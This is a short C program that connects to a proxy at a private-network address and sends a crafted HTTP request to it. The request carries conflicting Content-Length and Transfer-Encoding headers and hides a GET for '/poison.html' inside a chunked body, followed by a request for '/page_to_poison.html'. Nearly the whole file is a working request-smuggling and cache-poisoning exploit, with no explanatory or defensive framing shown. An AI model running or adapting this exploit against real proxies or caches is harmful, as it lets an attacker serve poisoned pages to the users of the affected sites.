#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PROXY_IP "192.168.1.202"
#define PROXY_PORT 8080
#define BUFFER_SIZE 4096

int main() {
    int sock;
    struct sockaddr_in server;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        return 1;
    }

    // Set up server address
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(PROXY_IP);
    server.sin_port = htons(PROXY_PORT);

    // Connect to server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        close(sock);
        return 1;
    }

    // Request to be smuggled
    const char *smuggled_request =
            "GET /poison.html HTTP/1.1\r\n"
            "Host: 192.168.1.202:8080\r\n"
            "\r\n";

    // Second GET request
    const char *second_request =
            "GET /page_to_poison.html HTTP/1.1\r\n"
            "Host: 192.168.1.202:8080\r\n"
            "\r\n";

    char post_request[BUFFER_SIZE];
    snprintf(post_request, sizeof(post_request),
             "POST /doomle.html HTTP/1.1\r\n"
             "Host: 192.168.1.202:8080\r\n"
             "Content-Length: 0\r\n"
             "Transfer-Encoding: chunked\r\n"
             "\r\n"
             "%x\r\n"                       // Chunk size in hex
             "%s\r\n"                       // Smuggled request
             "0\r\n"                        // End chunk marker
             "\r\n"                         // Additional CRLF after 0
             "%s",                          // Second request
             (unsigned int)strlen(smuggled_request),
             smuggled_request,
             second_request);

    // Send the unified request
    if (send(sock, post_request, strlen(post_request), 0) < 0) {
        close(sock);
        return 1;
    }

    close(sock);
    return 0;
}